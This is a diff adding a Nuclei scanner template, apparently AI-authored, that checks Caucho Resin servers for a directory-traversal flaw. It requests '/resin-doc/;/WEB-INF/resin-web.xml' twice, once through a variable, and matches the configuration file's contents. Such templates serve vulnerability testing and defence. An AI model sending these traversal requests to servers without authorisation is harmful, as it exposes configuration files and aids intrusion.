@@ -1,0 +1,45 @@
+id: caucho-resin-directory-traversal
+info:
+  name: Caucho Resin Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Caucho Resin server versions 4.0.52 to 4.0.56 are vulnerable to directory traversal, allowing attackers to read web configuration files.
+  tags: directory-traversal
+  reference:
+    - https://fofa.so
+    - https://caucho.com
+
+variables:
+  filepath: "/WEB-INF/resin-web.xml"
+
+http:
+  - method: GET
+    path:
+      - "/resin-doc/;/WEB-INF/resin-web.xml"
+    headers:
+      User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "xmlns:resin"
+
+  - method: GET
+    path:
+      - "/resin-doc/;{{filepath}}"
+    headers:
+      User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "xmlns:resin"
